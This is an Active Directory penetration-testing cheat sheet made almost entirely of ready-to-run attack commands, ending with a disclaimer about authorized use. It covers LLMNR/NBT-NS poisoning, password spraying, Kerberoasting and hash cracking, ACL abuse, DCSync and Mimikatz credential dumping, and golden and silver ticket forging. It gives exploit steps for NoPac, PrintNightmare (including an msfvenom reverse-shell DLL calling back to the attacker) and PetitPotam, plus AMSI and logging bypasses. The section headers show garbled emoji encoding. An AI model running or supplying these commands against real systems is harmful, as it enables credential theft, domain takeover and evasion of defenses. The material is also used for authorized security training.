# Active Directory Penetration Testing Cheat Sheet

## üîç Initial Enumeration

### Network Discovery
```bash
# Passive Network Listening
sudo tcpdump -i <interface>
sudo responder -I <interface> -A

# Active Host Discovery
fping -asgq <IP>/<mask>
sudo nmap -v -A -iL hosts.txt -oN host_enum
```

### User Enumeration
```bash
# Kerbrute - Username Enumeration
kerbrute userenum -d <domain> --dc <IP_DC> jsmith.txt -o valid_ad_users

# SMB NULL Sessions
enum4linux -U <DC_IP> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
rpcclient -U "" -N <DC_IP>
rpcclient $> enumdomusers

# LDAP Anonymous Bind
ldapsearch -h <DC_IP> -x -b "DC=<domain>,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
./windapsearch.py --dc-ip <DC_IP> -u "" -U

# NetExec
$ nxc smb <DC_IP> --users
$ nxc smb <DC_IP> -u '' -p '' --users

# Valid Credentials
$ sudo crackmapexec smb <DC_IP> -u <user> -p <password> --users
```

## üï∑Ô∏è Network Poisoning Attacks

### Responder (Linux)
```bash
# Basic Poisoning
sudo responder -I <interface>

# With WPAD
sudo responder -I <interface> -wf

# Analyze Mode Only
sudo responder -I <interface> -A

# Crack Captured Hashes
hashcat -m 5600 <hash> /usr/share/wordlists/rockyou.txt
```

### Inveigh (Windows)
```powershell
# PowerShell Version
Import-Module .\Inveigh.ps1
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y

# C# Version
.\Inveigh.exe

# Interactive Console Commands
HELP
GET NTLMV2UNIQUE
GET NTLMV2USERNAMES
```

## üîë Password Attacks

### Password Policy Enumeration
```bash
# From Linux with Creds
nxc smb <IP_DC> -u <user> -p <password> --pass-pol

# SMB NULL Session
rpcclient -U "" -N <DC_IP>
rpcclient $> querydominfo
enum4linux -P <DC_IP>

# LDAP Anonymous
ldapsearch -h <DC_IP> -x -b "DC=<Domain>,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

```powershell
# From Windows
net accounts
Import-Module .\PowerView.ps1
Get-DomainPolicy
```

### Password Spraying
```bash
# From Linux
# Bash One-liner
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" <DC_IP> | grep Authority; done

# Kerbrute
kerbrute passwordspray -d <domain> --dc <DC_IP> valid_users.txt Welcome1

# NetExec
sudo nxc smb <DC_IP> -u valid_users.txt -p Password123 | grep +
sudo nxc smb <DC_IP> -u valid_users.txt -p Password123 --continue-on-success | grep +

# Local Admin Password Reuse
sudo nxc smb --local-auth <Network> -u administrator -H <hash_ntlm> | grep +
```

```powershell
# From Windows
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

## üîê Credentialed Enumeration

### NetExec
```bash
# User Enumeration
sudo nxc smb <ip> -u user -p pass --users

# Group Enumeration
sudo nxc smb <ip> -u user -p pass --groups

# Logged On Users
sudo nxc smb <ip> -u user -p pass --loggedon-users

# Share Enumeration
sudo nxc smb <ip> -u user -p pass --shares
sudo nxc smb <ip> -u user -p pass -M spider_plus --share 'Department Shares'

# BloodHound Collection
nxc ldap <ip> -u user -p pass --bloodhound --collection All
nxc ldap <ip> -u user -p pass --bloodhound --collection All --dns-server <IP_DC>
```

### SMBMap
```bash
# Basic Enumeration
smbmap -u <user> -p <password> -d <domain> -H <IP>

# Recursive Directory Listing
smbmap -u <user> -p <password> -d <domain> -H <IP> -R 'Department Shares' --dir-only
```

### RPCClient
```bash
# Connect with Creds
rpcclient -U <user> <IP>

# User Info by RID
rpcclient $> queryuser 0x457
rpcclient $> enumdomusers
```

### Windapsearch
```bash
# Domain Admins
python3 windapsearch.py --dc-ip <DC_IP> -u <user>@<domain> -p <password> --da

# Privileged Users
python3 windapsearch.py --dc-ip <DC_IP> -u <user>@<domain> -p <password> -PU
```

### PowerView
```powershell
# Import Module
Import-Module .\PowerView.ps1

# Domain Information
Get-Domain
Get-DomainController
Get-DomainSID

# User Information
Get-DomainUser
Get-DomainUser -Identity <user> -Domain <domain> | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

# Group Information
Get-DomainGroup
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Computer Information
Get-DomainComputer

# Trust Information
Get-DomainTrust
Get-DomainTrustMapping

# SPN Users
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

# Local Admin Access
Test-AdminAccess -ComputerName <computer_name>

# Find Domain Shares
Find-DomainShare
Find-InterestingDomainShareFile

# Find User Sessions
Find-DomainUserLocation
```

### ActiveDirectory Module
```powershell
# Import Module
Import-Module ActiveDirectory

# Domain Info
Get-ADDomain

# User with SPN
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Trust Relationships
Get-ADTrust -Filter *

# Group Enumeration
Get-ADGroup -Filter * | select name
Get-ADGroup -Identity "Backup Operators"
Get-ADGroupMember -Identity "Backup Operators"
```

## üé´ Kerberoasting

### From Linux
```bash
# Impacket GetUserSPNs
GetUserSPNs.py -dc-ip <DC_IP> <domain>/<user>
impacket-GetUserSPNs -dc-ip <DC_IP> <domain>/<user>

# Request All TGS Tickets
GetUserSPNs.py -dc-ip <DC_IP> <domain>/<user> -request
impacket-GetUserSPNs -dc-ip <DC_IP> <domain>/<user> -request

# Request Specific User
GetUserSPNs.py -dc-ip <DC_IP> <domain>/<user> -request-user <user_requested>
impacket-GetUserSPNs -dc-ip <DC_IP> <domain>/<user> -request-user <user_requested>

# Save to File
GetUserSPNs.py -dc-ip <DC_IP> <domain>/<user> -request-user <user_requested> -outputfile tgs
impacket-GetUserSPNs -dc-ip <DC_IP> <domain>/<user> -request-user <user_requested> -outputfile tgs

# Crack with Hashcat
hashcat -m 13100 tgs /usr/share/wordlists/rockyou.txt
```

### From Windows
```powershell
# Enumerate SPNs
setspn.exe -Q */*

# Manual Method
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<user>/<domain>"

# Retrieve All Tickets
setspn.exe -T <domain> -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

# Extract with Mimikatz
# base64 /out:true
# kerberos::list /export

# PowerView Method
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
Get-DomainUser -Identity <user> | Get-DomainSPNTicket -Format Hashcat
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\tgs.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /stats
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
.\Rubeus.exe kerberoast /user:<user> /nowrap
```

## üé≠ ACL Abuse

### Enumeration
```powershell
# PowerView ACL Enumeration
Import-Module .\PowerView.ps1

# Find Interesting ACLs
Find-InterestingDomainAcl

# Target Specific User
$sid = Convert-NameToSid <user1>
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# Check Group Membership
Get-DomainGroup -Identity "<group>" | select memberof

# PowerShell Method
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
foreach($line in [System.IO.File]::ReadLines("C:\Users\ad_users.txt")) {get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match '<domain>\\<user>'}}
```

### Exploitation
```powershell
# Change User Password
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<domain>\<user1>', $SecPassword)
$user2Password = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity <user2> -AccountPassword $user2Password -Credential $Cred -Verbose

# Add to Group
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('<domain>\<user2>', $SecPassword)
Add-DomainGroupMember -Identity '<Group>' -Members '<user2>' -Credential $Cred2 -Verbose

# Create Fake SPN for Kerberoasting
Set-DomainObject -Credential $Cred2 -Identity <user3> -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
.\Rubeus.exe kerberoast /user:<user3> /nowrap
```

### DCSync
```bash
# Impacket secretsdump
secretsdump.py -outputfile hashes -just-dc <domain>/<user3>@<IP_DC>
secretsdump.py -just-dc-ntlm <domain>/<user3>@<IP_DC>
secretsdump.py -just-dc-user <USERNAME> <domain>/<user3>@<IP_DC>
```

```powershell
# Mimikatz
# privilege::debug
# lsadump::dcsync /domain:<domain> /user:<domain>\<user> or Administrator
# lsadump::dcsync /domain:<domain> /user:<domain>\krbtgt
```

## üè∞ Privileged Access

### Remote Desktop
```powershell
# Enumerate RDP Access
Get-NetLocalGroupMember -ComputerName <Computer> -GroupName "Remote Desktop Users"
```

### WinRM
```powershell
# Enumerate WinRM Access
Get-NetLocalGroupMember -ComputerName <Computer> -GroupName "Remote Management Users"

# Connect from Windows
$password = ConvertTo-SecureString "<password>" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("<domain>\<user>", $password)
Enter-PSSession -ComputerName <Computer> -Credential $cred
```

```bash
# Connect from Linux
evil-winrm -i <IP> -u <user> -p <password>
```

### SQL Server
```powershell
# PowerUpSQL
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
Get-SQLQuery -Verbose -Instance "<IP>,1433" -username "<domain>\<user>" -password "<password>" -query '<query>'
```

```bash
# mssqlclient.py
mssqlclient.py <domain>/<user>@<IP> -windows-auth
# In SQL prompt:
enable_xp_cmdshell
xp_cmdshell whoami /priv
```

### Double Hop Workaround
```powershell
# Method 1: PSCredential Object
$SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<domain>\<user>', $SecPassword)
get-domainuser -spn -credential $Cred | select samaccountname

# Method 2: Register PSSession
Register-PSSessionConfiguration -Name <name> -RunAsCredential <domain>\<user>
Restart-Service WinRM
Enter-PSSession -ComputerName <PC> -Credential <domain>\<user> -ConfigurationName <name>
```

## üî• Bleeding Edge Vulnerabilities

### NoPac (CVE-2021-42278, CVE-2021-42287)
```bash
# Setup
git clone https://github.com/Ridter/noPac.git

# Scan for Vulnerability
sudo python3 scanner.py <domain>/<user>:<password> -dc-ip <DC_IP> -use-ldap

# Exploit
sudo python3 noPac.py <domain>/<user>:<password> -dc-ip <DC_IP> -dc-host <host> -shell --impersonate administrator -use-ldap

# DCSync with NoPac
sudo python3 noPac.py <domain>/<user>:<password> -dc-ip <DC_IP> -dc-host <host> --impersonate administrator -use-ldap -dump -just-dc-user <domain>/<user>
```

### PrintNightmare (CVE-2021-34527, CVE-2021-1675)
```bash
# Setup
git clone https://github.com/cube0x0/CVE-2021-1675.git
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket && python3 ./setup.py install

# Check for MS-RPRN
rpcdump.py @<DC_IP> | egrep 'MS-RPRN|MS-PAR'

# Generate Payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Our_IP> LPORT=<Our_Port> -f dll > backupscript.dll

# Create SMB Share
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

# Exploit
sudo python3 CVE-2021-1675.py <domain>/<user>:<password>@<DC_IP> '\\<Our_IP>\CompData\backupscript.dll'
```

### PetitPotam (CVE-2021-36942)
```bash
# Setup NTLM Relay
sudo ntlmrelayx.py -debug -smb2support --target http://<host>.<domain>/certsrv/certfnsh.asp --adcs --template DomainController

# Run PetitPotam
python3 PetitPotam.py <attack_host_IP> <Domain_Controller_IP>

# Request TGT
python3 gettgtpkinit.py <domain>/<Machine>\$ -pfx-base64 <base64_cert> dc01.ccache
export KRB5CCNAME=dc01.ccache

# DCSync
secretsdump.py -just-dc-user <domain>/<user_wanted> -k -no-pass "<Machine>$"@<host>.<domain>
```

## üîó Domain Trust Attacks

### Trust Enumeration
```powershell
# PowerView
Get-DomainTrust
Get-DomainTrustMapping
Get-DomainUser -Domain <subdomain> | select SamAccountName

# Active Directory Module
Import-Module activedirectory
Get-ADTrust -Filter *
Get-DomainTrust

# Built-in Tools
netdom query /domain:<domain> trust
netdom query /domain:<domain> dc
netdom query /domain:<domain> workstation
```

### Child to Parent Domain Attack
```powershell
# Gather Required Information
# KRBTGT Hash
# lsadump::dcsync /user:<domain>\krbtgt

# Domain SID
Get-DomainSID

# Enterprise Admins SID
Get-DomainGroup -Domain <domain> -Identity "Enterprise Admins" | select distinguishedname,objectsid

# Create Golden Ticket with Mimikatz
# kerberos::golden /user:hacker /domain:<subdomain> /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt

# Create Golden Ticket with Rubeus
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:<subdomain> /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt

# Perform DCSync
# lsadump::dcsync /user:<domain>\<user>
```

```bash
# From Linux
# Get Domain SIDs
lookupsid.py <subdomain>/<user>@<dc_subdomain_ip> | grep "Domain SID"
lookupsid.py <subdomain>/<user>@<dc_subdomain_ip> | grep -B12 "Enterprise Admins"

# Create Golden Ticket
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain <subdomain> -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker

# Use Ticket
export KRB5CCNAME=hacker.ccache
psexec.py <subdomain>/hacker@<main_domain_host_dc> -k -no-pass -target-ip <IP_DC_Main>

# Automated with raiseChild.py
raiseChild.py -target-exec <IP_DC_Main> <subdomain>/<user>
```

### Cross-Forest Trust Attack
```powershell
# Cross-Forest Kerberoasting
Get-DomainUser -SPN -Domain <domain2> | select SamAccountName
Get-DomainUser -Domain <domain2> -Identity <user> |select samaccountname,memberof
.\Rubeus.exe kerberoast /domain:<domain2> /user:<user> /nowrap

# Foreign Group Membership
Get-DomainForeignGroupMember -Domain <domain2>
Convert-SidToName <MemberNameSid>
Enter-PSSession -ComputerName <DC_Domain2> -Credential <domain1>\administrator
```

```bash
# Cross-Forest Kerberoasting from Linux
GetUserSPNs.py -target-domain <domain2> <domain1>/<user>
GetUserSPNs.py -request -target-domain <domain2> <domain1>/<user>

# BloodHound Data Collection
# Domain 1
bloodhound-python -d <domain1> -dc <host_DC_Domain1> -c All -u <user> -p <password> --zip

# Domain 2
bloodhound-python -d <domain2> -dc <host_DC_Domain2> -c All -u <user>@<domain1> -p <password> --zip
```

## üìä BloodHound

### Data Collection
```bash
# From Linux
sudo bloodhound-python -u '<user>' -p '<password>' -ns <IP_DC> -d <domain> -c all
sudo bloodhound-python -u '<user>' -p '<password>' -ns <IP_DC> -d <domain> -c all --zip

# NetExec
nxc ldap <ip> -u user -p pass --bloodhound --collection All
nxc ldap <ip> -u user -p pass --bloodhound --collection All --dns-server <IP>
```

```powershell
# From Windows
.\SharpHound.exe -c All --zipfilename <name_zip>

# SharpHound.ps1
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain <domain> -ZipFileName loot.zip -LdapUsername <user> -LdapPassword "<password>"
```

## üñ•Ô∏è Living Off the Land

### Basic Enumeration
```cmd
hostname
ipconfig /all
whoami /all
net user
net group /domain
net group "Domain Admins" /domain
net accounts
net view /domain
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

```powershell
# PowerShell History
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt

# Environment Variables
Get-ChildItem Env: | ft Key,Value

# Execution Policy
Get-ExecutionPolicy -List
Set-ExecutionPolicy Bypass -Scope Process

# Downgrade PowerShell
powershell.exe -version 2
```

### Defense Enumeration
```powershell
# Windows Defender
Get-MpComputerStatus
sc query windefend

# AppLocker
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# Language Mode
$ExecutionContext.SessionState.LanguageMode

# Firewall
netsh advfirewall show allprofiles

# Logged Users
qwinsta
```

### WMI Commands
```cmd
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```

### Dsquery
```powershell
# User Search
dsquery user

# Computer Search
dsquery computer

# Wildcard Search
dsquery * "CN=Users,DC=<domain>,DC=LOCAL"

# Users with PASSWD_NOTREQD
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

# Domain Controllers
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```

## ü©∏ BloodyAD Tool Reference

### Basic Operations
```bash
# Retrieve User Information
bloodyAD --host $dc -d $domain -u $username -p $password get object $target_username

# Add User To Group
bloodyAD --host $dc -d $domain -u $username -p $password add groupMember $group_name $member_to_add

# Change Password
bloodyAD --host $dc -d $domain -u $username -p $password set password $target_username $new_password

# Give User GenericAll Rights
bloodyAD --host $dc -d $domain -u $username -p $password add genericAll $DN $target_username

# WriteOwner
bloodyAD --host $dc -d $domain -u $username -p $password set owner $target_group $target_username

# Read GMSA Password
bloodyAD --host $dc -d $domain -u $username -p $password get object $target_username --attr msDS-ManagedPassword

# Enable Disabled Account
bloodyAD --host $dc -d $domain -u $username -p $password remove uac $target_username -f ACCOUNTDISABLE

# Add Delegation Flag
bloodyAD --host $dc -d $domain -u $username -p $password add uac $target_username -f TRUSTED_TO_AUTH_FOR_DELEGATION

# Modify UPN
bloodyAD --host $dc -d $domain -u $username -p $password set object $old_upn userPrincipalName -v $new_upn

# Shadow Credentials
bloodyAD --host $dc -d $domain -u $username -p $password add shadowCredentials $target

# Write SPN
bloodyAD --host $dc -d $domain -u $username -p $password set object $target servicePrincipalName -v 'domain/meow'

# Create Computer Account
bloodyAD --host $dc -d $domain -u $username -p $password add computer $computer_name $computer_password

# Add RBCD
bloodyAD --host $dc -d $domain -u $username -p $password add rbcd 'DELEGATE_TO$' 'DELEGATE_FROM$'

# Find Writable Attributes
bloodyAD --host $dc -d $domain -u $username -p $password get writable --detail

# Find Deleted Objects
bloodyAD --host $dc -d $domain -u $username -p $password get writable --include-del

# Restore Deleted Object
bloodyAD --host $dc -d $domain -u $username -p $password -k set restore $user_to_restore
```

## üîß PowerView Complete Reference

### Domain Information
```powershell
Get-Domain                          # Find current domain
Get-DomainSID                       # Find current domain's SID
Get-DomainPolicyData               # Returns domain policy
Get-DomainController               # Find domain controllers
Get-DomainOU                       # List organizational units
```

### User, Group & Computer Enumeration
```powershell
Get-DomainUser                     # List users in domain
Get-DomainComputer                 # List computers in domain
Get-DomainGroup                    # List groups in domain
Get-DomainGroupMember -Identity "Domain Admins" -Recurse  # Domain admin members
Get-NetLocalGroup -ComputerName Computer1 -ListGroups  # List local groups on remote computer
```

### Domain Trust Enumeration
```powershell
Get-NetDomainTrust                 # Get trusts for current domain
Get-NetForest                      # List forest details
Get-NetForestDomain               # List all domains in forest
Get-NetForestTrust                # Map forest trusts
```

### Share Enumeration
```powershell
Get-NetShare -ComputerName sqlserver    # List shares on machine
Invoke-ShareFinder                      # Search for shares on network
Invoke-FileFinder                       # Search for files on network
Get-NetFileServer                       # List file servers in domain
```

### User Hunting
```powershell
Get-NetLoggedonLocal -ComputerName Computer1     # Find logged in users
Invoke-UserHunter -CheckAccess                   # Check if domain admins are logged in
Find-DomainUserLocation                          # Find where users are logged in
```

### GPO Enumeration
```powershell
Get-DomainGPO                           # List GPOs in domain
Get-DomainGPOLocalGroup                 # GPOs that modify local group memberships
```

### ACL Enumeration
```powershell
Get-DomainObjectAcl -SamAccountName test -ResolveGUIDs    # Get ACL for specific object
Find-InterestingDomainAcl -ResolveGUIDs                   # Find interesting ACLs
```

### Kerberos Delegation
```powershell
Get-DomainComputer -Unconstrained       # Check for unconstrained delegation
Get-DomainUser -TrustedToAuth           # Check for constrained delegation
```

### Advanced PowerView Functions
```powershell
# Export results to CSV
Export-PowerViewCSV

# Convert name/group to SID
ConvertTo-SID

# Get Kerberos ticket for SPN
Get-DomainSPNTicket

# Find interesting domain shares
Find-DomainShare
Find-InterestingDomainShareFile

# Check for local admin access
Find-LocalAdminAccess

# Domain trust mapping
Get-DomainTrustMapping

# Foreign users and groups
Get-DomainForeignUser
Get-DomainForeignGroupMember
```

## üéØ Common Attack Vectors

### Password in Description Field
```powershell
Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
```

### PASSWD_NOTREQD Users
```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

### ASREPRoasting
```powershell
# Enumerate DONT_REQ_PREAUTH
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

# Rubeus
.\Rubeus.exe asreproast /user:<user> /nowrap /format:hashcat

# Crack with Hashcat
hashcat -m 18200 asrep /usr/share/wordlists/rockyou.txt
```

```bash
# Kerbrute
kerbrute userenum -d <domain> --dc <DC_IP> /opt/jsmith.txt

# GetNPUsers.py
GetNPUsers.py <domain>/ -dc-ip <DC_IP> -no-pass -usersfile valid_ad_users
```

### GPP Passwords
```bash
# NetExec
nxc smb <DC_IP> -u <user> -p <password> -M gpp_autologin
```

### DNS Record Enumeration
```bash
# adidnsdump
adidnsdump -u <domain>\\<user> ldap://<DC_IP>
adidnsdump -u <domain>\\<user> ldap://<DC_IP> -r
```

### LAPS Enumeration
```powershell
# Find LAPS delegated groups
Find-LAPSDelegatedGroups

# Find extended rights
Find-AdmPwdExtendedRights

# Get LAPS computers
Get-LAPSComputers
```

### GPO Abuse
```powershell
# Enumerate GPO Names
Get-DomainGPO | select displayname
Get-GPO -All | Select DisplayName

# Check GPO Rights
$sid=Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```

## üîç Miscellaneous Tools & Techniques

### Printer Bug
```powershell
# Check Spooler Status
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName <ComputerName>
```

### MS14-068
```bash
# PyKEK
python ms14-068.py -u <user> -d <domain> -p <password> -s <user_sid>
```

## üõ°Ô∏è Detection Evasion

### AMSI Bypass
```powershell
# Method 1
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

# Method 2
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Script Block Logging Bypass
```powershell
# Downgrade PowerShell
powershell.exe -version 2
```

### Constrained Language Mode Bypass
```powershell
# Check current mode
$ExecutionContext.SessionState.LanguageMode

# Bypass using PowerShell v2
powershell.exe -version 2 -command "Get-Host"
```

## üìã Quick Reference Commands

### Essential NetExec Commands
```bash
# Basic Auth Test
nxc smb <target> -u <user> -p <password>

# Hash Authentication
nxc smb <target> -u <user> -H <ntlm_hash>

# Password Spray
nxc smb <targets_file> -u <users_file> -p <password> --continue-on-success

# Dump SAM
nxc smb <target> -u <user> -p <password> --sam

# Dump LSA
nxc smb <target> -u <user> -p <password> --lsa

# Dump NTDS
nxc smb <target> -u <user> -p <password> --ntds

# Execute Commands
nxc smb <target> -u <user> -p <password> -x "whoami"

# PowerShell Commands
nxc smb <target> -u <user> -p <password> -X "Get-Host"
```

### Essential Impacket Commands
```bash
# secretsdump.py
secretsdump.py <domain>/<user>:<password>@<target>
secretsdump.py -hashes <lm>:<ntlm> <domain>/<user>@<target>

# psexec.py
psexec.py <domain>/<user>:<password>@<target>
psexec.py -hashes <lm>:<ntlm> <domain>/<user>@<target>

# wmiexec.py
wmiexec.py <domain>/<user>:<password>@<target>

# smbexec.py
smbexec.py <domain>/<user>:<password>@<target>

# atexec.py
atexec.py <domain>/<user>:<password>@<target> "whoami"

# dcomexec.py
dcomexec.py <domain>/<user>:<password>@<target>

# GetUserSPNs.py
GetUserSPNs.py <domain>/<user>:<password> -dc-ip <dc_ip> -request

# GetNPUsers.py
GetNPUsers.py <domain>/<user>:<password> -dc-ip <dc_ip>

# lookupsid.py
lookupsid.py <domain>/<user>:<password>@<target>

# ticketer.py (Golden Ticket)
ticketer.py -nthash <krbtgt_hash> -domain-sid <domain_sid> -domain <domain> <username>
```

### Mimikatz Essentials
```cmd
# Privilege Escalation
privilege::debug

# Dump Credentials
sekurlsa::logonpasswords

# DCSync
lsadump::dcsync /domain:<domain> /user:<username>

# Golden Ticket
kerberos::golden /user:<user> /domain:<domain> /sid:<domain_sid> /krbtgt:<krbtgt_hash> /ptt

# Silver Ticket
kerberos::golden /user:<user> /domain:<domain> /sid:<domain_sid> /target:<target> /service:<service> /rc4:<service_hash> /ptt

# List Tickets
kerberos::list

# Pass the Hash
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>

# Pass the Ticket
kerberos::ptt <ticket_file>
```

### Rubeus Essentials
```powershell
# ASREPRoast
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Kerberoast
.\Rubeus.exe kerberoast /format:hashcat /outfile:kerberoast.txt

# Harvest Tickets
.\Rubeus.exe harvest /interval:30

# Golden Ticket
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<domain> /sid:<domain_sid> /user:<username> /ptt

# Silver Ticket
.\Rubeus.exe silver /rc4:<service_hash> /domain:<domain> /sid:<domain_sid> /target:<target> /service:<service> /user:<username> /ptt

# Pass the Ticket
.\Rubeus.exe ptt /ticket:<base64_ticket>

# Dump Tickets
.\Rubeus.exe dump

# Renew Ticket
.\Rubeus.exe renew /ticket:<base64_ticket>
```

---

**‚ö†Ô∏è Disclaimer**: This cheat sheet is for educational and authorized penetration testing purposes only. Always ensure proper authorization before conducting security assessments.
